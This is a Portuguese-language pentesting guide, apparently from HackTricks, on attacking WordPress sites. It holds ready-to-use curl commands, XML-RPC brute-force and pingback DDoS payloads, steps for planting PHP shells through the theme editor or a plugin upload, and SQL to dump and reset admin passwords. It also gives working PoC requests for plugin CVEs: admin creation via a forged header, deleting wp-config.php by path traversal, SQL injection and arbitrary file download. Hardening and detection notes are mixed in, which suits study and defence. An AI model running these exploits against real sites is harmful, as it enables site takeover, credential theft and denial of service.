# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informações Básicas

- **Arquivos enviados** vão para: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Arquivos de temas podem ser encontrados em /wp-content/themes/,** então se você alterar algum php do tema para obter RCE provavelmente usará esse caminho. Por exemplo: Usando **tema twentytwelve** você pode **acessar** o arquivo **404.php** em: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Outra URL útil pode ser:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Em **wp-config.php** você pode encontrar a senha root do banco de dados.
- Caminhos de login padrão para verificar: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Principais arquivos do WordPress**

- `index.php`
- `license.txt` contém informações úteis como a versão do WordPress instalada.
- `wp-activate.php` é usado no processo de ativação por e-mail ao configurar um novo site WordPress.
- Pastas de login (podem ser renomeadas para ocultá-las):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` é um arquivo que representa um recurso do WordPress que permite que dados sejam transmitidos com HTTP atuando como o mecanismo de transporte e XML como o mecanismo de codificação. Esse tipo de comunicação foi substituído pela WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- A pasta `wp-content` é o diretório principal onde plugins e temas são armazenados.
- `wp-content/uploads/` é o diretório onde quaisquer arquivos enviados para a plataforma são armazenados.
- `wp-includes/` é o diretório onde arquivos do núcleo são armazenados, como certificados, fontes, arquivos JavaScript e widgets.
- `wp-sitemap.xml` Em versões do WordPress 5.5 e superiores, o WordPress gera um arquivo sitemap XML com todas as publicações públicas e tipos de post e taxonomias consultáveis publicamente.

**Pós-exploração**

- O arquivo `wp-config.php` contém informações necessárias para o WordPress conectar-se ao banco de dados, como o nome do banco, host do banco, usuário e senha, chaves de autenticação e salts, e o prefixo das tabelas do banco. Esse arquivo de configuração também pode ser usado para ativar o modo DEBUG, o que pode ser útil para resolver problemas.

### Permissões de Usuários

- **Administrador**
- **Editor**: Publica e gerencia seus próprios posts e os de outros
- **Autor**: Publica e gerencia seus próprios posts
- **Colaborador**: Escreve e gerencia seus posts, mas não pode publicá-los
- **Assinante**: Visualiza posts e edita seu perfil

## **Enumeração Passiva**

### **Obter versão do WordPress**

Verifique se consegue encontrar os arquivos `/license.txt` ou `/readme.html`

Dentro do **código-fonte** da página (exemplo de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Arquivos de link CSS

![](<../../images/image (533).png>)

- Arquivos JavaScript

![](<../../images/image (524).png>)

### Obter Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obter Temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extrair versões em geral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumeração ativa

### Plugins and Themes

Você provavelmente não conseguirá encontrar todos os Plugins and Themes possíveis. Para descobrir todos eles, você precisará **realizar ativamente um Brute Force em uma lista de Plugins and Themes** (esperançosamente existem ferramentas automatizadas que contenham essas listas).

### Usuários

- **ID Brute:** Você obtém usuários válidos de um site WordPress ao Brute Forcing IDs de usuários:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Se as respostas forem **200** ou **30X**, isso significa que o id é **válido**. Se a resposta for **400**, então o id é **inválido**.

- **wp-json:** Você também pode tentar obter informações sobre os usuários consultando:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Outro `/wp-json/` endpoint que pode revelar algumas informações sobre usuários é:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Somente informações sobre os usuários que têm esse recurso habilitado serão fornecidas**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Ao fazer login em **`/wp-login.php`**, a **mensagem** é **diferente**, indicando se o **username** existe ou não.

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (Você pode automatizar esse processo [using this](https://github.com/relarizky/wpxploit), por exemplo).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**Verificar**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** são alguns dos métodos que podem ser usados para brute-force credentials. Se você encontrar qualquer um deles, pode enviar algo como:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
A mensagem _"Incorrect username or password"_ em uma resposta com código 200 deve aparecer se as credenciais não forem válidas.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Usando as credenciais corretas, você pode fazer upload de um arquivo. Na resposta, o caminho aparecerá ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force creds using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Este método é destinado a programas e não a humanos, e é antigo; portanto não suporta 2FA. Assim, se você tem creds válidas mas a entrada principal está protegida por 2FA, **você pode conseguir abusar de xmlrpc.php para fazer login com essas creds contornando o 2FA**. Note que você não conseguirá realizar todas as ações que pode fazer pelo console, mas ainda assim pode chegar a RCE como o Ippsec explica em [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Se você obtiver **faultCode** com um valor **maior** que **0** (17), isso significa que a porta está aberta.

Veja o uso de **`system.multicall`** na seção anterior para aprender como abusar desse método para causar DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Este arquivo geralmente existe na raiz do site Wordpress: **`/wp-cron.php`**\
Quando esse arquivo é **accessed**, uma consulta MySQL "**heavy**" é executada, então ele pode ser usado por **attackers** para **cause** um **DoS**.\
Além disso, por padrão, o `wp-cron.php` é chamado a cada carregamento de página (sempre que um cliente solicita qualquer página do Wordpress), o que em sites de alto tráfego pode causar problemas (DoS).

Recomenda-se desabilitar o Wp-Cron e criar um cronjob real no host que execute as ações necessárias em intervalos regulares (sem causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Tente acessar _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ e o Worpress site pode fazer uma requisição para você.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Esta ferramenta verifica se o **methodName: pingback.ping** e o path **/wp-json/oembed/1.0/proxy** existem e, se existirem, tenta explorá-los.

## Ferramentas Automáticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obter acesso sobrescrevendo um bit

Mais uma curiosidade do que um ataque real. No CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) você podia inverter 1 bit em qualquer arquivo wordpress. Então você podia inverter a posição `5389` do arquivo `/var/www/html/wp-includes/user.php` para transformar a operação NOT (`!`) em NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Painel RCE**

**Modificando um php do tema usado (são necessárias credenciais de admin)**

Aparência → Editor de Tema → Template 404 (à direita)

Altere o conteúdo para um php shell:

![](<../../images/image (384).png>)

Pesquise na internet como acessar essa página atualizada. Neste caso você deve acessar aqui: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Você pode usar:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
para obter uma sessão.

## RCE em plugin

### Plugin PHP

Pode ser possível enviar arquivos .php como um plugin.\
Crie seu backdoor em php usando, por exemplo:

![](<../../images/image (183).png>)

Depois adicione um novo plugin:

![](<../../images/image (722).png>)

Faça upload do plugin e pressione Install Now:

![](<../../images/image (249).png>)

Clique em Procced:

![](<../../images/image (70).png>)

Provavelmente isso aparentemente não fará nada, mas se você for em Media, verá seu shell carregado:

![](<../../images/image (462).png>)

Acesse-o e você verá a URL para executar o reverse shell:

![](<../../images/image (1006).png>)

### Enviar e ativar plugin malicioso

Este método envolve a instalação de um plugin malicioso conhecido por ser vulnerável e que pode ser explorado para obter um web shell. Esse processo é realizado através do WordPress dashboard da seguinte forma:

1. **Plugin Acquisition**: O plugin é obtido de uma fonte como Exploit DB, por exemplo [**here**](https://www.exploit-db.com/exploits/36374).
2. **Instalação do Plugin**:
- Navegue até o WordPress dashboard, então vá para `Dashboard > Plugins > Upload Plugin`.
- Faça upload do arquivo zip do plugin baixado.
3. **Ativação do Plugin**: Uma vez que o plugin seja instalado com sucesso, ele deve ser ativado através do dashboard.
4. **Exploração**:
- Com o plugin "reflex-gallery" instalado e ativado, ele pode ser explorado por ser conhecido como vulnerável.
- O Metasploit framework fornece um exploit para essa vulnerabilidade. Carregando o módulo apropriado e executando comandos específicos, uma sessão meterpreter pode ser estabelecida, concedendo acesso não autorizado ao site.
- Observa-se que este é apenas um dos muitos métodos para explorar um site WordPress.

O conteúdo inclui auxílios visuais que mostram os passos no WordPress dashboard para instalar e ativar o plugin. Entretanto, é importante notar que explorar vulnerabilidades dessa maneira é ilegal e antiético sem a devida autorização. Essas informações devem ser usadas de forma responsável e somente em um contexto legal, como pentesting com permissão explícita.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS para RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ é um script projetado para escalar uma vulnerabilidade de **Cross-Site Scripting (XSS)** para **Remote Code Execution (RCE)** ou outras vulnerabilidades críticas no WordPress. Para mais info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Ele fornece **suporte para versões do WordPress 6.X.X, 5.X.X and 4.X.X. e permite:**
- _**Privilege Escalation:**_ Cria um usuário no WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Faz upload do seu plugin customizado (backdoor) para o WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edita um Built-In Plugin no WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edita um Built-In Theme no WordPress.
- _**(Custom) Custom Exploits:**_ Exploits customizados para Third-Party WordPress Plugins/Themes.

## Pós-Exploração

Extrair nomes de usuário e senhas:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Alterar a senha do admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Superfície de Ataque

Saber como um plugin do Wordpress pode expor funcionalidades é fundamental para encontrar vulnerabilidades nessas funcionalidades. Você pode ver como um plugin pode expor funcionalidades nos pontos a seguir e alguns exemplos de plugins vulneráveis em [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Uma das formas de um plugin expor funções para usuários é via AJAX handlers. Eles podem conter bugs de lógica, autorização ou autenticação. Além disso, é bastante frequente que essas funções baseiem tanto a autenticação quanto a autorização na existência de um Wordpress nonce que **qualquer usuário autenticado na instância do Wordpress pode ter** (independentemente do seu papel).

Estas são as funções que podem ser usadas para expor uma função em um plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**O uso de `nopriv` torna o endpoint acessível a quaisquer usuários (até mesmo não autenticados).**

> [!CAUTION]
> Além disso, se a função apenas verifica a autorização do usuário com a função `wp_verify_nonce`, essa função só verifica se o usuário está logado; normalmente não verifica o papel do usuário. Portanto, usuários com privilégios baixos podem ter acesso a ações de alto privilégio.

- **REST API**

Também é possível expor funções do WordPress registrando uma REST API usando a função `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
O `permission_callback` é uma função de callback que verifica se um dado usuário está autorizado a chamar o método da API.

**Se a função integrada `__return_true` for usada, ela simplesmente pulará a verificação de permissões do usuário.**

- **Acesso direto ao arquivo php**

Claro, Wordpress usa PHP e os arquivos dentro dos plugins são diretamente acessíveis pela web. Portanto, caso um plugin exponha alguma funcionalidade vulnerável que seja acionada apenas ao acessar o arquivo, ela poderá ser explorada por qualquer usuário.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Alguns plugins implementam atalhos de “trusted header” para integrações internas ou reverse proxies e então usam esse header para definir o contexto do usuário atual para requisições REST. Se o header não for vinculado criptograficamente à requisição por um componente upstream, um atacante pode forjar ele e atingir rotas REST privilegiadas como administrador.

- Impacto: escalada de privilégio não autenticada para admin ao criar um novo administrador via a rota REST core users.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (força o user ID 1, tipicamente a primeira conta de administrador).
- Rota explorada: `POST /wp-json/wp/v2/users` com um array de role elevado.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Por que funciona

- O plugin mapeia um cabeçalho controlado pelo cliente para o estado de autenticação e ignora verificações de capability.
- O core do WordPress espera a capability `create_users` para esta rota; o hack do plugin contorna isso definindo diretamente o contexto do usuário atual a partir do cabeçalho.

Indicadores de sucesso esperados

- HTTP 201 com um corpo JSON descrevendo o usuário criado.
- Um novo usuário administrador visível em `wp-admin/users.php`.

Lista de verificação para detecção

- Procure por `getallheaders()`, `$_SERVER['HTTP_...']`, ou SDKs de terceiros que leem cabeçalhos customizados para definir o contexto do usuário (por exemplo, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revise os registros REST em busca de callbacks privilegiados que não possuem verificações robustas de `permission_callback` e que em vez disso dependem de cabeçalhos da requisição.
- Procure usos de funções core de gerenciamento de usuários (`wp_insert_user`, `wp_create_user`) dentro de handlers REST que são protegidos apenas por valores de cabeçalho.

Endurecimento

- Nunca derive autenticação ou autorização a partir de cabeçalhos controlados pelo cliente.
- Se um reverse proxy precisar injetar identidade, termine a confiança no proxy e remova cópias recebidas (e.g., `unset X-Wcpay-Platform-Checkout-User` na borda), depois passe um token assinado e verifique-o no servidor.
- Para rotas REST que realizam ações privilegiadas, exija verificações `current_user_can()` e um `permission_callback` estrito (NÃO use `__return_true`).
- Prefira autenticação first-party (cookies, application passwords, OAuth) em vez de “impersonation” via cabeçalho.

Referências: veja os links no final desta página para um caso público e uma análise mais ampla.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemas introduzidos por este trecho:

* **Acesso não autenticado** – o `wp_ajax_nopriv_` hook está registrado.
* **Sem verificação de nonce / capability** – qualquer visitante pode acessar o endpoint.
* **Sem sanitização do caminho** – a string `fontfamily` controlada pelo usuário é concatenada a um caminho do filesystem sem filtragem, permitindo o clássico `../../` traversal.

#### Exploração

Um atacante pode excluir qualquer arquivo ou diretório **abaixo do diretório base de uploads** (normalmente `<wp-root>/wp-content/uploads/`) enviando uma única requisição HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Porque `wp-config.php` fica fora de *uploads*, quatro sequências de `../` são suficientes em uma instalação padrão. Deletar `wp-config.php` força o WordPress a entrar no *installation wizard* na próxima visita, permitindo a tomada completa do site (o atacante apenas fornece uma nova configuração de DB e cria um usuário admin).

Outros alvos impactantes incluem arquivos `.php` de plugin/theme (para quebrar security plugins) ou regras `.htaccess`.

#### Checklist de detecção

* Qualquer callback `add_action( 'wp_ajax_nopriv_...')` que chame helpers do sistema de arquivos (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenação de input de usuário não sanitizado em caminhos (procure por `$_POST`, `$_GET`, `$_REQUEST`).
* Ausência de `check_ajax_referer()` e `current_user_can()`/`is_user_logged_in()`.

#### Endurecimento
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Sempre** trate qualquer operação de escrita/remoção no disco como privilegiada e verifique duas vezes:
> • Autenticação  • Autorização  • Nonce  • Sanitização da entrada  • Contenção de caminho (ex.: via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via restauração de funções obsoletas e autorização ausente (ASE "View Admin as Role")

Muitos plugins implementam um recurso de "view as role" ou troca temporária de função salvando a(s) função(ões) originais em user meta para que possam ser restauradas depois. Se o caminho de restauração depender apenas de parâmetros de requisição (por exemplo, `$_REQUEST['reset-for']`) e de uma lista mantida pelo plugin sem verificar capabilities e um nonce válido, isso se torna uma escalada vertical de privilégios.

Um exemplo real foi encontrado no plugin Admin and Site Enhancements (ASE) (≤ 7.6.2.1). O ramo de reset restaurava funções com base em `reset-for=<username>` se o username aparecesse em um array interno `$options['viewing_admin_as_role_are']`, mas não executava nem um `current_user_can()` nem uma verificação de nonce antes de remover as funções atuais e re-adicionar as funções salvas em user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Por que é explorável

- Confia em `$_REQUEST['reset-for']` e em uma opção do plugin sem autorização no lado do servidor.
- Se um usuário anteriormente tinha privilégios mais altos salvos em `_asenha_view_admin_as_original_roles` e foi rebaixado, ele pode restaurá-los acessando o reset path.
- Em algumas implantações, qualquer usuário autenticado poderia acionar um reset para outro nome de usuário ainda presente em `viewing_admin_as_role_are` (autorização quebrada).

Pré-requisitos do ataque

- Versão vulnerável do plugin com o recurso ativado.
- A conta alvo tem uma role de alto privilégio obsoleta armazenada em user meta de uso anterior.
- Qualquer sessão autenticada; ausência de nonce/capability no fluxo de reset.

Exploração (exemplo)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Em builds vulneráveis isso remove as funções atuais e readiciona as funções originais salvas (por exemplo, `administrator`), escalando privilégios.

Checklist de detecção

- Procure por recursos de troca de função que persistam “funções originais” em user meta (por exemplo, `_asenha_view_admin_as_original_roles`).
- Identifique caminhos de reset/restore que:
- Leem nomes de usuário de `$_REQUEST` / `$_GET` / `$_POST`.
- Modificam funções via `add_role()` / `remove_role()` sem `current_user_can()` e `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizam com base em um array de opção do plugin (por exemplo, `viewing_admin_as_role_are`) em vez das capacidades do ator.

Mitigações

- Implemente verificações de capability em cada ramo que altere estado (por exemplo, `current_user_can('manage_options')` ou mais restrito).
- Exija nonces para todas as mutações de função/permissão e verifique-os: `check_admin_referer()` / `wp_verify_nonce()`.
- Nunca confie em nomes de usuário fornecidos pela requisição; resolva o usuário alvo no servidor com base no ator autenticado e em uma política explícita.
- Invalide o estado de “funções originais” em atualizações de perfil/função para evitar restauração obsoleta de privilégios elevados:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
Considere armazenar o mínimo de estado e usar tokens com duração limitada, protegidos por capability, para trocas temporárias de função.

---

### Considerações de WAF para WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many high‑impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

Notas ofensivas

- Mire endpoints específicos do plugin com payloads limpos: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Teste primeiro caminhos não autenticados (AJAX `nopriv`, REST com `permission_callback` permissivo, shortcodes públicos). Payloads padrão frequentemente funcionam sem obfuscação.
- Casos típicos de alto impacto: elevação de privilégios (broken access control), arbitrary file upload/download, LFI, open redirect.

Notas defensivas

- Não confie em assinaturas genéricas de WAF para proteger CVEs de plugins. Implemente patches virtuais específicos de vulnerabilidade na camada de aplicação ou atualize rapidamente.
- Prefira checagens de segurança positivas no código (capabilities, nonces, validação estrita de entrada) em vez de filtros regex negativos.

## Proteção do WordPress

### Atualizações regulares

Certifique-se de que WordPress, plugins e themes estão atualizados. Também confirme que a atualização automática está habilitada em wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Além disso, **instale apenas plugins e temas WordPress confiáveis**.

### Plugins de Segurança

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Outras Recomendações**

- Remova o usuário padrão **admin**
- Use **senhas fortes** e **2FA**
- **Revise** periodicamente as **permissões** dos usuários
- **Limite tentativas de login** para prevenir ataques de Brute Force
- Renomeie o arquivo **`wp-admin.php`** e permita acesso apenas internamente ou de certos endereços IP.


### Injeção SQL não autenticada via validação insuficiente (WP Job Portal <= 2.3.2)

O plugin de recrutamento WP Job Portal expôs uma tarefa **savecategory** que acaba por executar o seguinte código vulnerável dentro de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** – `parentid` comes straight from the HTTP request.
2. **String concatenation inside the WHERE clause** – no `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** – although the action is executed through `admin-post.php`, the only check in place is a **CSRF nonce** (`wp_verify_nonce()`), which any visitor can retrieve from a public page embedding the shortcode `[wpjobportal_my_resumes]`.

#### Exploração

1. Pegue um nonce novo:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injete SQL arbitrário abusando de `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
A resposta revela o resultado da query injetada ou altera o banco de dados, comprovando a SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Outra tarefa, **downloadcustomfile**, permitia que visitantes baixassem **qualquer arquivo no disco** via path traversal.  O sink vulnerável está localizado em `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` é controlado pelo atacante e concatenado **sem sanitização**.  Novamente, a única barreira é um **CSRF nonce** que pode ser obtido na página de currículo.

#### Exploração
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
O servidor responde com o conteúdo de `wp-config.php`, leaking DB credentials and auth keys.

## Referências

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
